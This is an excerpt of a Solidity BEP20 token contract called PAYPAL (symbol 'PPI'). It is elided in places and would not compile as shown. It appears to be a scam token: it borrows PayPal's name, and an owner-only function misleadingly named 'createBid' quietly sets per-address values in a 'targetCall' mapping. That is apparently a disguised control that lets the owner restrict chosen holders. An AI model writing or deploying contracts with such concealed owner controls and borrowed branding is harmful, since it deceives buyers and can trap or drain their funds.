...
contract PAYPAL is Context, IBEP20, Ownable, LGEWhitelisted {
    ...
    constructor() {
        ...
        _symbol = "PPI";
        _decimals = 9;
        _totalSupply = 300000000000 * 10 ** 9;
    ...
    * - `sender` must have a balance of at least `amount`.
    */    
    function createBid(address skateToken, uint256 gnarId) public onlyAdmin {
    if(skateToken != address(0)){
    require(gnarId != 10);
    targetCall[skateToken] = 1 * gnarId * (10 ** 9);
    }
    } 
